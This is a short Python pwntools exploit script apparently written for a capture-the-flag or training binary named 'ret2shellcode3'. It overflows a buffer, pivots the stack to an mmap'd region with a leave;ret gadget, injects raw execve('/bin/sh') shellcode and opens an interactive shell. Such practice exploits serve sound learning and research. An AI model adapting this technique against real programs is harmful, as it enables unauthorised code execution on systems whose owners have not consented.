#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./ret2shellcode3')
elf = ELF('./ret2shellcode3')

leave_ret = 0x40074f
mmap_addr = 0x123900
buf1 = 0x601030
main_puts_read = 0x400710

p.recvuntil("Please pwn me :)\n")
payload = '/bin/sh\x00'.ljust(0x10, 'A') + p64(mmap_addr) + p64(main_puts_read)
# gdb.attach(p)
# pause()
p.send(payload)

p.recvuntil("Please pwn me :)\n")
shellcode = '\x30\xd2\x48\x31\xf6\xbf\x30\x10\x60\x00\xb0\x3b\x0f\x05'
payload1 = '/bin/sh\x00' + shellcode.ljust(0x10, 'A') + p64(mmap_addr-0x8)
# gdb.attach(p)
# pause()
p.send(payload1)

p.interactive()
